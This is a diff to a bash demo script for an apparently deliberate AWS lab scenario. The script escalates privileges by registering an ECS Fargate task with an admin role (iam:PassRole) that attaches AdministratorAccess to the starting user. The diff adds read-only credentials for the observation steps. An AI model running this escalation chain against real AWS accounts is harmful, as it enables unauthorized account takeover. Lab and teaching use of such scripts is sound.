@@ -68,6 +68,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -78,22 +87,32 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -104,15 +123,19 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -122,8 +145,10 @@ else
 fi
 echo ""
 
-# Step 5: Create ECS cluster
+# [EXPLOIT] Step 5: Create ECS cluster
 echo -e "${YELLOW}Step 5: Creating ECS cluster${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Cluster name: $CLUSTER_NAME"
 
 show_attack_cmd "Attacker" "aws ecs create-cluster --region $AWS_REGION --cluster-name $CLUSTER_NAME --output json"
@@ -134,10 +159,13 @@ aws ecs create-cluster \
 
 echo -e "${GREEN}✓ Successfully created ECS cluster${NC}\n"
 
-# Step 6: Get VPC and subnet for network configuration
+# [OBSERVATION] Step 6: Get VPC and subnet for network configuration
 echo -e "${YELLOW}Step 6: Getting network configuration for Fargate${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 
 # Get default VPC
+show_cmd "ReadOnly" "aws ec2 describe-vpcs --region $AWS_REGION --filters 'Name=is-default,Values=true' --query 'Vpcs[0].VpcId' --output text"
 DEFAULT_VPC=$(aws ec2 describe-vpcs \
     --region $AWS_REGION \
     --filters "Name=is-default,Values=true" \
@@ -152,6 +180,7 @@ fi
 echo "Default VPC: $DEFAULT_VPC"
 
 # Get subnets from default VPC
+show_cmd "ReadOnly" "aws ec2 describe-subnets --region $AWS_REGION --filters 'Name=vpc-id,Values=$DEFAULT_VPC' --query 'Subnets[*].SubnetId' --output text"
 SUBNETS=$(aws ec2 describe-subnets \
     --region $AWS_REGION \
     --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
@@ -165,8 +194,10 @@ SUBNET_2=$(echo $SUBNETS | awk '{print $2}')
 echo "Using subnets: $SUBNET_1, $SUBNET_2"
 echo -e "${GREEN}✓ Retrieved network configuration${NC}\n"
 
-# Step 7: Register task definition with admin role
+# [EXPLOIT] Step 7: Register task definition with admin role
 echo -e "${YELLOW}Step 7: Registering task definition with admin role${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE_NAME"
 echo "Target role ARN: $TARGET_ROLE_ARN"
 echo "This task will attach AdministratorAccess to the starting user"
@@ -217,8 +248,10 @@ TASK_DEF_ARN=$(aws ecs register-task-definition \
 echo "Registered task definition: $TASK_DEF_ARN"
 echo -e "${GREEN}✓ Successfully registered task definition (PassRole executed)${NC}\n"
 
-# Step 8: Create ECS service on Fargate
+# [EXPLOIT] Step 8: Create ECS service on Fargate
 echo -e "${YELLOW}Step 8: Creating ECS service on Fargate${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Service name: $SERVICE_NAME"
 
 # Create service configuration
@@ -247,8 +280,10 @@ aws ecs create-service \
 
 echo -e "${GREEN}✓ Successfully created ECS service${NC}\n"
 
-# Step 9: Wait for service to become ACTIVE and have running tasks
+# [OBSERVATION] Step 9: Wait for service to become ACTIVE and have running tasks
 echo -e "${YELLOW}Step 9: Waiting for service to become active and launch task${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "This may take 60-90 seconds..."
 
 MAX_WAIT=180
@@ -256,6 +291,7 @@ ELAPSED=0
 SERVICE_ACTIVE=false
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
+    show_cmd "ReadOnly" "aws ecs describe-services --region $AWS_REGION --cluster $CLUSTER_NAME --services $SERVICE_NAME --query 'services[0]' --output json"
     SERVICE_INFO=$(aws ecs describe-services \
         --region $AWS_REGION \
         --cluster $CLUSTER_NAME \
@@ -284,8 +320,10 @@ if [ "$SERVICE_ACTIVE" = false ]; then
 fi
 echo ""
 
-# Step 10: Wait for task to complete (reach STOPPED status)
+# [OBSERVATION] Step 10: Wait for task to complete (reach STOPPED status)
 echo -e "${YELLOW}Step 10: Waiting for task to complete its work${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "Monitoring task status..."
 
 MAX_TASK_WAIT=120
@@ -294,6 +332,7 @@ TASK_COMPLETED=false
 
 while [ $TASK_ELAPSED -lt $MAX_TASK_WAIT ]; do
     # Get the task ARN
+    show_cmd "ReadOnly" "aws ecs list-tasks --region $AWS_REGION --cluster $CLUSTER_NAME --service-name $SERVICE_NAME --query 'taskArns[0]' --output text"
     TASK_ARN=$(aws ecs list-tasks \
         --region $AWS_REGION \
         --cluster $CLUSTER_NAME \
@@ -302,6 +341,7 @@ while [ $TASK_ELAPSED -lt $MAX_TASK_WAIT ]; do
         --output text)
 
     if [ "$TASK_ARN" != "None" ] && [ -n "$TASK_ARN" ]; then
+        show_cmd "ReadOnly" "aws ecs describe-tasks --region $AWS_REGION --cluster $CLUSTER_NAME --tasks $TASK_ARN --query 'tasks[0].lastStatus' --output text"
         TASK_STATUS=$(aws ecs describe-tasks \
             --region $AWS_REGION \
             --cluster $CLUSTER_NAME \
@@ -333,11 +373,13 @@ echo "Waiting 15 seconds for policy changes to take effect..."
 sleep 15
 echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
-# Step 12: Verify administrator access
+# [OBSERVATION] Step 12: Verify administrator access
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "Attempting to list IAM users..."
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
